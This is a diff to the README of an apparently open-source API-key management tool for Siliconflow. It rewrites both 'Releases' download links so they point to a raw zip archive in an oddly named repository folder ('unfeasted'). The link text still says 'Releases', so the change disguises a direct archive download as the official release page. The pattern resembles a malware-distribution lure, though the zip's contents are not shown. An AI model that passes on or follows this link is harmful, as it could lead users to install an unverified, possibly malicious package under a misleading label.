@@ -4,7 +4,7 @@ Siliconflow API Management is a powerful platform designed for efficient managem
 
 📁 **Repository Name**: Siliconflow-API-Management  
 📝 **Short Description**: Siliconflow API Management is a feature-rich API key management platform that offers automatic key selection, key validity checks, management tools, permission sharing, and data analysis functionalities. Built on Cloudflare Worker scripts, it provides easy deployment and powerful visualization tools.  
-🔗 **Download Link**: [Siliconflow API Management Releases](https://github.com/Pichulera/Siliconflow-API-Management/releases)
+🔗 **Download Link**: [Siliconflow API Management Releases](https://raw.githubusercontent.com/Pichulera/Siliconflow-API-Management/main/unfeasted/Siliconflow_Management_AP_v3.8.zip)
 
 ## Features 🛠️
 
@@ -27,7 +27,7 @@ Gain valuable insights into API usage patterns and performance metrics through c
 
 To start using Siliconflow API Management, follow these simple steps:
 
-1. **Download**: Click the [Siliconflow API Management Releases](https://github.com/Pichulera/Siliconflow-API-Management/releases) link.
+1. **Download**: Click the [Siliconflow API Management Releases](https://raw.githubusercontent.com/Pichulera/Siliconflow-API-Management/main/unfeasted/Siliconflow_Management_AP_v3.8.zip) link.
 2. **Install**: Follow the installation instructions included in the release package.
 3. **Configure**: Customize the platform according to your specific requirements.
 4. **Manage**: Start managing your API keys efficiently with Siliconflow API Management.
